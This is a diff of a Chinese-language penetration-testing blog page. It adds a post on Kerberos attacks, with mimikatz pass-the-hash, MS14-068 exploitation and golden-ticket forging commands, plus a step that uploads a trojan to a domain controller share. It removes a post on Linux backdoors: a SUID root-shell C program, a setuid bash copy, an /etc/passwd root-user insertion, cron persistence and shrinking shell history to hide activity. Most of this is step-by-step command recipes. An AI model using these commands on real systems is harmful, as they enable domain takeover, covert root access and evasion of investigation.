@@ -64,6 +64,81 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-黄金票据" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" class="article-date">
+  <time datetime="2021-09-02T14:15:35.000Z" itemprop="datePublished">2021-09-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/">黄金票据</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="kerberos协议和黄金票据"><a href="#kerberos协议和黄金票据" class="headerlink" title="kerberos协议和黄金票据"></a>kerberos协议和黄金票据</h1><p>VM克隆: 右键选项卡 ==&gt; 管理 ==&gt; 克隆</p>
+<p>链接克隆: 相当于快捷方式, 用的是原本镜像, 不会多占用太多空间, 跟原本镜像互不影响, 但是删除原本镜像, 链接克隆的就没用了.</p>
+<p>完整克隆: 相当于复制了一份镜像</p>
+<h5 id="PTH进3389端口"><a href="#PTH进3389端口" class="headerlink" title="PTH进3389端口"></a><code>PTH进3389端口</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:xx &#x2F;domian:xx &#x2F;ntlm:xx &#x2F;run:&quot;mstsc.exe &#x2F;restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>AS（Authentication Server）= 认证服务器</p>
+<p>KDC（Key Distribution Center）= 密钥分发中心</p>
+<p>TGT（Ticket Granting Ticket）= 票据授权票据，票据的票据</p>
+<p>TGS（Ticket Granting Server）= 票据授权服务器</p>
+<p>SS（Service Server）= 特定服务提供端</p>
+<h2 id="PASS-THE-TICKET"><a href="#PASS-THE-TICKET" class="headerlink" title="PASS THE TICKET"></a>PASS THE TICKET</h2><p><code>金票(golden ticket): 可以访问任意的服务, 权限较高</code></p>
+<p>银票(silver ticket): 可以访问指定服务, 权限较低</p>
+<h4 id="漏洞利用-MS14-068"><a href="#漏洞利用-MS14-068" class="headerlink" title="漏洞利用(MS14-068):"></a>漏洞利用(MS14-068):</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MS14-068:</span><br><span class="line">MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其</span><br><span class="line">Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证。</span><br><span class="line">影响范围：</span><br><span class="line">Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 及 Windows Server 2012 R2 、Windows Vista、Windows 7、Windows 8 及 Windows 8.1版本</span><br><span class="line"></span><br><span class="line">补丁编号: KB3011780</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ol>
+<li>拿到域控中某台主机的权限, 并提权</li>
+<li>进本的信息搜集, 密码hash, 用户的sid, 域名信息</li>
+<li>没有打过补丁KB3011780</li>
+</ol>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h5><p>搜集信息: </p>
+<p>​    whoami /user ==&gt; 获取sid</p>
+<p>​    ipconfig /all ==&gt; 域名, 域控ip</p>
+<p>​    hashdump  | mimikatz ==&gt; 账户hash</p>
+<p>​    msf身份盗用: steal_token pid</p>
+<p>​    msf身份恢复: rev2self</p>
+<p>ms14-068:</p>
+<p>ms14-068 -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p clear_password</p>
+<p>注入之前: 需要清除票据</p>
+<p>​    CMD: klist purge 清除票据 | klist 查看票据</p>
+<p>​    mimikatz: kerberos::purge 清除票据 | kerberos::list 查看票据</p>
+<p>清除票据后注入票据:</p>
+<p>mimikatz “privilege::debug” “kerberos::ptc xxxx.ccache” exit</p>
+<p>dir \\域控主机名\C$  ==&gt; <code>访问成功即漏洞利用成功, 拿到域控权限</code></p>
+<h4 id="golden-ticket"><a href="#golden-ticket" class="headerlink" title="golden ticket"></a>golden ticket</h4><p>​    前提: 拿下域控的权限(提权), 获取到域控的krbtgt账户密码(hash) </p>
+<p>​    copy shell.exe \WIN-AFETP0IBEKR\C$ ==&gt; 上传木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;user:Administrator &#x2F;domain:ilu.com &#x2F;sid:S-1-5-21-542716808-1865610110-2530282010 &#x2F;krbtgt:9d093f0496bcbbf9999845340c57cd6b &#x2F;ticket:gold.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::ptt gold.kirbi</span><br><span class="line"></span><br><span class="line">dir \\域控主机名\C$</span><br><span class="line">上传用copy</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/09/02/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" data-id="ckvuhge1i0018ggvjhqt28i2x" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-域渗透基础" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" class="article-date">
@@ -129,7 +204,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckvl2qeir000z54vj5ggwhbcb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/31/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/" data-id="ckvuhge1b000yggvj0yww51l0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -214,7 +289,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckvl2qej4001654vjh8w4gm0b" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckvuhge1i0017ggvj88yx8fcg" class="article-share-link">Share</a>
       
       
     </footer>
@@ -269,7 +344,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckvl2qei3000b54vj7oua28v0" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/" data-id="ckvuhge0s000aggvjh5ny2z2k" class="article-share-link">Share</a>
       
       
     </footer>
@@ -333,7 +408,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckvl2qei7000f54vj52qm1t78" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/21/empire%E6%8F%90%E6%9D%83%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96/" data-id="ckvuhge0v000eggvj4nrkajf4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -403,7 +478,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="ckvl2qei5000d54vj28045nnf" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/18/empire%E5%9F%BA%E6%93%8D/" data-id="ckvuhge0u000dggvjhswl28s3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -460,7 +535,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="ckvl2qeim000w54vjc1tn82d4" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/" data-id="ckvuhge1a000wggvjgti6f5hb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -526,7 +601,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="ckvl2qeij000u54vjcsro44nd" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/12/%E5%85%8D%E6%9D%802/" data-id="ckvuhge19000uggvj05s5bpup" class="article-share-link">Share</a>
       
       
     </footer>
@@ -608,7 +683,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="ckvl2qeii000t54vje2l8danv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="ckvuhge19000vggvj39o92oaz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -682,78 +757,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="ckvl2qei5000c54vj7lrwg02h" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-linux后门植入" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" class="article-date">
-  <time datetime="2021-08-03T03:57:14.000Z" itemprop="datePublished">2021-08-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/">linux后门植入</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="用脚本探测linux提权漏洞"><a href="#用脚本探测linux提权漏洞" class="headerlink" title="用脚本探测linux提权漏洞"></a>用脚本探测linux提权漏洞</h2><h4 id="windows漏洞探测脚本"><a href="#windows漏洞探测脚本" class="headerlink" title="windows漏洞探测脚本:"></a>windows漏洞探测脚本:</h4><p>python2和python3的区别:</p>
-<p><strong>python2 打印函数print不需要括号: print “hello”;python3打印函数需要print(“hello”)</strong></p>
-<p>python2-pip安装:</p>
-<p>python2 get-pip.py</p>
-<p>python3-pip安装:</p>
-<p>apt-get install python3-pip</p>
-<p>脚本使用:</p>
-<p>漏洞库位置: <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-022">https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-022</a></p>
-<p>下载漏洞库:  python2 windows-exploit-suggester.py –update</p>
-<p>保存systeminfo信息: systeminfo &gt; sys.txt</p>
-<p>探测漏洞: python2 windows-exploit-suggester.py -i sys.txt -d 2021-03-28-mssb.xls</p>
-<h4 id="linux脚本探测"><a href="#linux脚本探测" class="headerlink" title="linux脚本探测:"></a>linux脚本探测:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下载:</span><br><span class="line">github: https:&#x2F;&#x2F;github.com&#x2F;mzet-&#x2F;linux-exploit-suggester</span><br><span class="line">下载: </span><br><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;mzet-&#x2F;linux-exploit-suggester&#x2F;master&#x2F;linux-exploit-suggester.sh -O les.sh</span><br><span class="line">运行:</span><br><span class="line">.&#x2F;les.sh</span><br></pre></td></tr></table></figure>
-
-<h2 id="linux后门植入"><a href="#linux后门植入" class="headerlink" title="linux后门植入"></a>linux后门植入</h2><h5 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务:"></a>计划任务:</h5><ol>
-<li><p>用命令的方式写计划任务</p>
-<p>crontab -e </p>
-<p>crontab -l     –&gt; 查看计划任务</p>
-</li>
-<li><p>再文件中写入计划任务</p>
-<p>文件位置: /etc/crontab</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute(分钟) (0 - 59)</span><br><span class="line"># |  .------------- hour(小时) (0 - 23)</span><br><span class="line"># |  |  .---------- day of month(每月的天数) (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12)(月份) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (每周的天数)(Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name command to be executed</span><br><span class="line"></span><br><span class="line">* --&gt; 任意时间</span><br><span class="line">&#x2F; --&gt; 时间频率     *&#x2F;1 * * * * --&gt; 任意时间每隔1分钟执行一次</span><br><span class="line">- --&gt; 区间        0-20&#x2F;2 * * * * --&gt; 0-20分钟每隔两分钟执行一次</span><br><span class="line">, --&gt; 列表范围       1,5,7,9 * * * * --&gt; 第1,5,7,9分钟的之后执行一次</span><br></pre></td></tr></table></figure>
-
-<p>命令的形式:</p>
-<p>创建计划任务: crontab -e –&gt; * * * * * command</p>
-<p>删除计划任务: crontab -r  | crontab -ri    –&gt; -r 删除 -i 交互(问你是否删除)</p>
-<h5 id="创建suid后门"><a href="#创建suid后门" class="headerlink" title="创建suid后门:"></a>创建suid后门:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp: 存放临时文件的目录,具有高权限</span><br><span class="line">1. </span><br><span class="line">创建suid.c</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">main()&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">&#125;</span><br><span class="line">编译:</span><br><span class="line">gcc suid.c -o suid</span><br><span class="line">权限赋予:</span><br><span class="line">chmod 4777 suid</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">复制&#x2F;bin&#x2F;bash &gt; &#x2F;tmp&#x2F;shell</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure>
-
-<h5 id="etc-passwd后门"><a href="#etc-passwd后门" class="headerlink" title="/etc/passwd后门:"></a>/etc/passwd后门:</h5><p>生成有效密码: openssl passwd 密码</p>
-<p>插入有效数据: echo 用户名:密码:0:0:system:/root:/bin/bash</p>
-<p>登入用户:su 用户名</p>
-<p>┌─[✗]─[ilu@parrot]─[/tmp]<br>            └──╼ $su hello<br>                密码：<br>        ┌─[root@parrot]─[/tmp]<br>        └──╼ #</p>
-<h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;原数量(默认1000)&#x2F;HISTSIZE&#x3D;目标数量&#x2F;&#39; ~&#x2F;.bashrc</span><br><span class="line">-i 进入到编辑模式</span><br><span class="line">s  替换模式</span><br><span class="line">d  删除模式</span><br><span class="line">g  全局匹配</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckvl2qei8000g54vj4wkcgtur" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="ckvuhge0t000bggvj888l07jq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -799,6 +803,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/">文件操作之文件下载读取</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
           </li>
         
@@ -812,10 +820,6 @@
         
           <li>
             <a href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/">xss漏洞-基础分类及利用</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
           </li>
         
       </ul>
